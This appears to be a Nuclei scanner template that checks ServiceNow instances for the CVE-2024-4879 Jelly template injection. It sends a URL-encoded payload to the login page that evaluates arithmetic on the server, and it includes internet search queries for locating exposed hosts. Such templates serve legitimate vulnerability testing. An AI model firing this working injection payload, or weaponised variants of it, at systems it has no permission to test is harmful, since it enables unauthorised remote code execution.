id: ServiceNowUI-Jelly-RCE-CVE-2024-4879

info:
  name: ServiceNowUI-Jelly-RCE-CVE-2024-4879
  author: HK
  severity: high
  description: ServiceNow UI Jelly模板注入(CVE-2024-4879)
  metadata:
    fofa-query: body="ConditionalFocus.jsdbx"
    Quake-query: body="ConditionalFocus.jsdbx"
    Hunter-query: body="ConditionalFocus.jsdbx"
    verified: true
  tags: rce,cve,ServiceNowUI

http:
- raw:
  - |+
    @timeout: 30s
    GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(111*111);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
    Host: {{Hostname}}

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'contains(body_1, "12321")'
      condition: and